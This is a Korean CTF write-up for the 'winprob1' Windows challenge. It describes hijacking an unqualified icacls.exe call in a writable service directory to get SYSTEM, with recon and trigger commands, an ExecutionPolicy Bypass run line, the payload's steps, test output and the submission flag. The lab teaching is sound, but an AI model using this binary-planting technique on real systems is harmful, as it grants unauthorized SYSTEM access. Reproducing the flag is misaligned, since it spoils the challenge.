---
title: "[Hypersonic CTF] winprob1 Writeup"
date: 2026-06-09 02:40:00 +0900
categories: [ctf, windows]
tags: [writeup, windows, lpe, privilege-escalation, service-hijacking]
ctf_event: "Hypersonic CTF"
challenge: "winprob1"
challenge_category: windows
toc: true
comments: false
---

소속클럽 : 대전대학교 HACTOR

## Challenge

```text
welcome, clankers. You have simple task : LPE and get flag
```

목표는 Windows medium guest 권한에서 Local Privilege Escalation을 수행한 뒤, SYSTEM 권한으로 플래그 파일을 읽는 것이다.

제공된 VM 압축 파일의 비밀번호는 다음과 같았다.

```text
sadazoosadazoo
```

공지로 제공된 medium guest 계정은 다음과 같다.

```text
ctf / ctf
```

## TL;DR

`CtfSentinel` 서비스는 `127.0.0.1:8765`에서 로컬 API를 열고 있었다. API는 `x-agent-token: ctf-local-dev` 헤더를 요구했지만, 토큰은 바이너리와 설정에서 확인할 수 있었다.

서비스는 reload/scan 과정에서 `icacls.exe`를 전체 경로 없이 실행했다. medium 권한의 사용자가 서비스 실행 디렉터리에 파일을 쓸 수 있었기 때문에, 해당 위치에 가짜 `icacls.exe`를 배치한 뒤 `/reload`를 호출하면 payload가 SYSTEM 권한으로 실행된다.

최종 exploit은 `.NET Framework`가 없는 plain Windows에서도 동작하도록 native x64 payload를 PowerShell에 base64로 내장했다.

```powershell
powershell -ExecutionPolicy Bypass -File .\exploit.ps1 -Force
```

## VM Setup

Hyper-V VM 파일은 `VM3.zip`으로 제공되었고, 내부에는 VHDX와 VM 설정 파일이 있었다.

```text
VM3/
VM3/Virtual Hard Disks/VM3.vhdx
VM3/Virtual Machines/C64D01B8-7F0B-4B4D-B173-AAEB9FF812F0.vmcx
```

로컬 환경에서 Hyper-V 관리 cmdlet이 바로 잡히지 않아 VHDX를 VMware VMDK로 변환해서 부팅했다.

```powershell
vmware-vdiskmanager.exe -r ".\extracted\VM3\Virtual Hard Disks\VM3.vhdx" -t 0 ".\vmware_vm\VM3.vmdk"
```

VMware에서는 SATA/SCSI 부팅이 불안정했지만 IDE 디스크로 연결하면 Windows 로그인 화면까지 정상 부팅되었다.

## Service Recon

VM 내부 서비스는 `CtfSentinel`이었다.

```powershell
Get-CimInstance Win32_Service -Filter "Name='CtfSentinel'"
```

서비스와 관련된 주요 값은 다음과 같았다.

```text
Service name : CtfSentinel
API          : http://127.0.0.1:8765
Token        : ctf-local-dev
Config       : C:\ProgramData\CtfSentinel\sentinel.toml
Binary dir   : C:\ProgramData\CtfSentinel\bin
```

확인된 API endpoint는 다음과 같다.

```text
POST /reload
POST /scan
POST /cleanup
POST /log-cleanup
GET  /config
GET  /rules
GET  /inventory
GET  /registry
```

요청에는 아래 헤더가 필요했다.

```text
x-agent-token: ctf-local-dev
```

## Vulnerability

핵심 취약점은 서비스가 권한 있는 작업 중 `icacls.exe`를 전체 경로 없이 호출한다는 점이다.

분석 중 다음 형태의 문자열을 확인할 수 있었다.

```text
icacls.exe "
" /inheritance:e /grant *S-1-1-0:(OI)(CI)M /Q
```

Windows 프로세스 생성 시 실행 파일 이름만 주어지면 현재 디렉터리 또는 검색 경로를 따라 실행 파일을 찾는다. 여기서는 서비스 실행 디렉터리인 `C:\ProgramData\CtfSentinel\bin`에 medium 권한 사용자가 파일을 쓸 수 있었다.

따라서 공격 흐름은 다음과 같다.

1. `C:\ProgramData\CtfSentinel\bin\icacls.exe`에 payload를 작성한다.
2. `POST /reload` 또는 scan 관련 동작을 트리거한다.
3. `CtfSentinel` 서비스가 SYSTEM 권한으로 `icacls.exe`를 실행한다.
4. fake `icacls.exe`가 SYSTEM 권한으로 플래그 파일을 읽는다.
5. 결과를 medium 사용자가 읽을 수 있는 위치에 저장한다.

## Exploit

exploit 파일:

```text
exploit.ps1
```

SHA256:

```text
1FDBE2915340FD2C85EF5F78A93445E067EA5C3643A686C53FE451536F819BC6
```

payload:

```text
payload_icacls.exe
```

SHA256:

```text
7E48555D1452B583407EE413D960099C427932CBF819368A8345DCE7F8A9AF74
```

PowerShell exploit은 다음 순서로 동작한다.

1. `Win32_Service`에서 `CtfSentinel`의 실행 경로를 찾는다.
2. 실행 파일 디렉터리를 구한다.
3. 해당 디렉터리에 쓸 수 있는지 확인한다.
4. base64로 내장된 native x64 payload를 `icacls.exe`로 저장한다.
5. `watch\marker.txt`, `watch\flag.seed`를 생성해 서비스 동작을 유도한다.
6. 로컬 API에 `/reload`, `/scan`, `/cleanup`, `/log-cleanup` 요청을 보낸다.
7. payload 결과 파일을 polling한다.
8. 결과 파일 내용을 stdout으로 출력한다.

API 호출 부분은 다음과 같다.

```powershell
Invoke-WebRequest `
  -UseBasicParsing `
  -Method POST `
  -Uri "http://127.0.0.1:8765/reload" `
  -Headers @{ "x-agent-token" = "ctf-local-dev" }
```

payload는 다음 위치에 결과를 쓴다.

```text
C:\Users\Public\flag_out.txt
C:\ProgramData\CtfSentinel\flag_out.txt
C:\Windows\Temp\flag_out.txt
```

그리고 다음 경로들을 확인한다.

```text
C:\flag.txt
C:\flag
C:\ProgramData\flag.txt
C:\ProgramData\flag
C:\Windows\Temp\flag.txt
C:\Windows\Temp\flag
C:\Users\Administrator\Desktop\flag.txt
C:\Users\Administrator\Desktop\flag
C:\Users\*\Desktop\flag.txt
C:\Users\*\Desktop\flag
```

## Local Test

로컬 VM에서 exploit을 실행했다.

```powershell
powershell -ExecutionPolicy Bypass -File .\exploit.ps1 -Force
```

출력:

```text
[*] target dir: C:\ProgramData\CtfSentinel\bin
[*] wrote payload: C:\ProgramData\CtfSentinel\bin\icacls.exe (36864 bytes)
[*] armed marker/seed files
[*] POST http://127.0.0.1:8765/reload
    status=202
[*] POST http://127.0.0.1:8765/scan
    status=202
[+] SYSTEM payload output: C:\Users\Public\flag_out.txt
[payload] icacls hijack executed
[user] SYSTEM
[found] C:\flag.txt
HS{test}

[done]
```

중요한 부분은 `[user] SYSTEM`이다. 즉, fake `icacls.exe`가 서비스 권한으로 실행되었고 LPE가 성공했다.

`HS{test}`는 로컬 VM 이미지의 테스트 플래그이므로 제출 플래그가 아니다. 실제 플래그는 remote instance에서 같은 exploit을 실행해야 얻을 수 있다.

## Remote Execution

원격 인스턴스에서 파일을 업로드할 수 있다면 다음처럼 실행한다.

```powershell
powershell -ExecutionPolicy Bypass -File .\exploit.ps1 -Force
```

RDP가 불가능하고 운영자가 medium 권한 shell에서 실행해주는 방식이라면, `exploit.ps1`만 전달하고 stdout을 요청하면 된다.

요청 문구 예시:

```text
winprob1 exploit입니다.
plain Windows에서 동작하도록 .NET Framework 없이 작성했습니다.

다음 명령으로 실행 부탁드립니다.

powershell -ExecutionPolicy Bypass -File .\exploit.ps1 -Force

stdout 전체를 복사해서 전달 부탁드립니다.
관리자 shell이 떨어지는 방식은 아니지만, SYSTEM 권한 payload가 실행되면 stdout에 [user] SYSTEM 및 flag 파일 내용이 출력됩니다.
```

성공 시 stdout에는 다음 형태가 포함된다.

```text
[payload] icacls hijack executed
[user] SYSTEM
[found] C:\flag.txt
HS{...}
```

## Why Not Bruteforce

처음에는 압축 파일과 VM 파일 때문에 해시/압축 관련 접근을 고려할 수 있었지만, 문제의 본질은 password cracking이 아니라 Windows LPE였다.

압축 비밀번호가 공지로 제공된 이후에는 brute force가 필요하지 않았다. VM을 열고 서비스 동작을 분석한 뒤, 서비스의 실행 경로 검색 문제를 이용하는 것이 가장 빠르고 안정적인 풀이였다.

## Flag

로컬 VM:

```text
HS{test}
```

실제 제출 플래그:

```text
HS{hello_windows_world}
```

로컬 테스트 플래그인 `HS{test}`와 이전에 발견된 `HS{where_is_msrc}`는 제출 플래그가 아니다.
